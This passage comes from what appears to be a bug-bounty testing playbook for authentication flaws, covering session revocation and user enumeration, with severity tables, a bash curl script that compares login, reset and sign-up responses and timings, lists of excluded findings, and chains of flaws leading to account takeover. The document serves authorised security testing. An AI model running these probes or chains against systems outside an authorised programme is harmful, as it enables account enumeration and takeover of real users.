  short-lived JWT keeps working until its `exp` a few minutes away. Other sessions survive a password change in
  settings: many products keep them on purpose, and the same after a reset is the stronger case. Logout clears
  the browser cookie while the server-side session lives on: closed as informative because the attacker must
  already hold the cookie. Several sessions at once, or no session list, is design. A page shown from the
  browser cache after logout is not a session.
- **Escalate:** the paying shape is an explicit revocation that fails: a session removed in settings that stays
  valid on another API, a disconnected login provider, a disabled account whose API key works. Say "the owner
  cannot evict an intruder" and show it. A removed organisation member who keeps access is BAC and rates
  higher. A remember-me value that looks structured goes to AUT-002. For token lifetimes see JWT-008 and
  JWT-009.

### AUT-018 · Login, reset or sign-up answers differently for registered and unregistered identifiers

| | |
|---|---|
| **Severity** | None standalone on most programmes; Low where membership itself is sensitive or the answer returns more than existence |
| **Requires** | account |
| **Excluded by** | user-enum |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Disclosure · CWE-204 |
| **Prior art** | #77067, #758280, #39486, #666722 |

- **Where:** login errors, the reset request, sign-up and username-availability checks, "resend confirmation",
  invitation and share dialogs that resolve an address to a user, SSO discovery by e-mail, and any of them that
  shows the 2FA prompt only for real accounts.
- **Test:** send the same request with our own registered address and with a random unregistered one. Compare
  status, length, body, headers and redirect target, then the median response time over repeated requests.
- **How:**
  ```bash
  R='<A e-mail>'; N="aut018-$RANDOM-nobody@<our mail domain>"; D="$E/evidence/$H/AUT-018"; mkdir -p "$D"; CT='Content-Type: application/json'
  pr(){ curl -sS "${HDR[@]}" -D "$D/$1.hdr" -o "$D/$1.body" -w "$1 %{http_code} %{size_download} %{redirect_url}\n" -X POST "$2" -H "$CT" -d "$3"; sleep 1; }
  pr login-reg   "$T/api/login"           "{\"email\":\"$R\",\"password\":\"wrong-Aut018\"}"
  pr login-unreg "$T/api/login"           "{\"email\":\"$N\",\"password\":\"wrong-Aut018\"}"
  pr reset-reg   "$T/api/password/forgot" "{\"email\":\"$R\"}"
  pr reset-unreg "$T/api/password/forgot" "{\"email\":\"$N\"}"
  pr avail-reg   "$T/api/signup/check"    "{\"email\":\"$R\"}"
  pr avail-unreg "$T/api/signup/check"    "{\"email\":\"$N\"}"
  sha256sum "$D"/*.body; diff "$D/login-reg.body" "$D/login-unreg.body"; diff "$D/reset-reg.body" "$D/reset-unreg.body"
  # timing: six samples each (more would trip a lockout on our own account), the two middle values of each compared
  for id in "$R" "$N"; do for i in $(seq 1 6); do curl -sS "${HDR[@]}" -o /dev/null -w '%{time_total}\n' -X POST "$T/api/login" -H "$CT" \
    -d "{\"email\":\"$id\",\"password\":\"wrong-Aut018\"}"; sleep 2; done | sort -n | sed -n '3p;4p' | tr '\n' ' '; echo " <- $id"; done
  ```
  Do not submit a real sign-up for the unregistered address; use the availability check, or the validation
  error of a deliberately incomplete form.
- **Proof:** two requests that differ only in the identifier and a stable difference between the answers, and
  one sentence on why existence matters on this product. For timing: the medians, the spread and the sample
  count.
- **Not a finding when:** the policy lists `user-enum`, which most do. The product has public profiles, so the
  username is public anyway. The difference comes from the limiter or a captcha state, not from the account.
  Timing differs within noise. The reset answers uniformly and only sign-up reveals taken addresses: the same
  excluded class, not a bypass of it.
- **Escalate:** an answer that returns more than one bit (user id, name, masked phone, tenant, the account's SSO
  provider) is information disclosure on its own (INF chapter). A differential on a service whose membership
  is private (health, dating, internal staff portals) can be rated low to medium. Valid identifiers are what
  AUT-001, AUT-003 and AUT-008 assume, but those proofs stay on our own accounts.

## Graveyard

- **Session still valid after logout or password change, long session lifetime, no idle timeout.** Excluded on
  most programmes (`session-expiry`). Paid only when an explicit revocation fails (AUT-017).
- **Concurrent sessions allowed, no session list, no "log out other devices" button.** Design; closed N/A.
- **No rate limit on login, on the reset request or on "resend e-mail"; mail flooding of an address.** Closed
  as informative (`rate-limit`, `dos`). It matters only when a short code falls (AUT-008).
- **User, e-mail or phone enumeration** on login, reset or sign-up (`user-enum`).
- **Reset token in the `Referer` to an analytics or CDN vendor.** Informative since browsers default to
  `strict-origin-when-cross-origin`, and the vendor is not the attacker.
- **Host header reflected in a response while the reset mail keeps the real host** (`host-header`).
- **Reset link valid for hours, several reset links valid at once, reset link not expiring on login.**
  Informative without a leak to pair it with.
- **Weak password policy, no lockout, password reuse allowed, no notification mail on password change,
  `autocomplete` on password fields.** Best practice; never paid.
- **"No e-mail verification on sign-up"** where nothing trusts the address. Informative.
- **2FA hygiene:** 2FA not mandatory, TOTP replay inside its own 30-second step, backup codes viewable in
  settings, no password asked to disable 2FA with a fresh session. Mostly informative.
- **"Response manipulation" that only changes what the SPA draws.** The next API call is refused; no finding.
- **Session fixation with no way to plant the cookie; session cookie without `HttpOnly` or `SameSite`**
  (`missing-headers`).
- **Login CSRF and logout CSRF** (`csrf-low`).
- **Pre-account takeover on a programme that has seen it before.** Rated low and very often a duplicate.
- **Default or weak credentials on a vendor's hosted service** (`third-party`), and **credentials from breach
  dumps** (`leaked-credentials`): never tried.
- **Reset by convincing support staff** (`social-engineering`); **reset link read on an unlocked device or off
  the wire** (`physical`, `mitm`).
- **Missing or bypassable captcha** with no consequence beyond more requests (`rate-limit`).
- **Scanner output: "password field with autocomplete", "session cookie scoped to parent domain"**
  (`automated`).

## Chains

- AUT-018 → AUT-001, AUT-003, AUT-008: valid identifiers. The proofs still run on our own accounts.
- HHI (Host header trusted by the application) → AUT-001. CCH: a cached poisoned reset page. RDR: an open
  redirect on the reset page carries the token off-site.
- AUT-001 or AUT-003 → AUT-006: a reset that logs in without the code takes over 2FA accounts too.
- AUT-010 → AUT-008: the limiter bypass is what makes the code space reachable. GQL-007 (alias batching) and
  RAC (parallel guesses, one code spent twice) do the same job.
- AUT-005 → AUT-009: the password-step session disables the second factor permanently.
- XSS, CSR or AUT-016 → AUT-015: a ridden session becomes a permanent takeover; → AUT-009: it also removes 2FA.
- STO (sibling subdomain takeover) or CRL (`Set-Cookie` injection) → AUT-016: the delivery step fixation lacks.
- JWT-004 (cracked or default signing secret) → AUT-002: forged reset and remember-me tokens. JWT-008 and
  JWT-009 ↔ AUT-004, AUT-017: stateless tokens that cannot be revoked.
- AUT-012 → AUT-014 → AUT-013: a spelling variant that inherits verification, a verified address the attacker
  does not own, and an SSO merge on top.
- AUT-014 → OAU (e-mail-matched SSO on relying parties), BAC (domain auto-join, invitation acceptance).
- API (mass assignment) → AUT-014 (`email_verified`), AUT-009 (`two_factor_enabled`).
- INF (session or reset token in logs, URLs, error pages) → AUT-004, AUT-017: missing revocation makes one leak
  permanent.

## Sources

- `kb/reports/authn.md` and `kb/reports/all/authn.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"Authentication"}`, `find_bypasses {"protection":"2FA"}`,
  `find_bypasses {"protection":"rate limit"}`, `find_payloads {"topic":"Account Takeover"}`.
- PortSwigger Web Security Academy, Authentication vulnerabilities and Password reset poisoning; OWASP WSTG
  sections ATHN (authentication) and SESS (session management); OWASP ASVS V2 and V3.
- PayloadsAllTheThings, Account Takeover; HackTricks, Reset/Forgotten Password Bypass and 2FA/OTP Bypass.
- Avinash Sudhodanan and Andrew Paverd, "Pre-hijacked accounts: An Empirical Study of Security Failures in User
  Account Creation on the Web" (USENIX Security 2022).
- James Kettle, "Practical HTTP Host header attacks" (2013). RFC 6238 (TOTP), RFC 4226 (HOTP), RFC 7239
  (`Forwarded`).
- Tools: `oathtool` (TOTP and HOTP codes from a base32 secret), Playwright (request capture on the reset page).
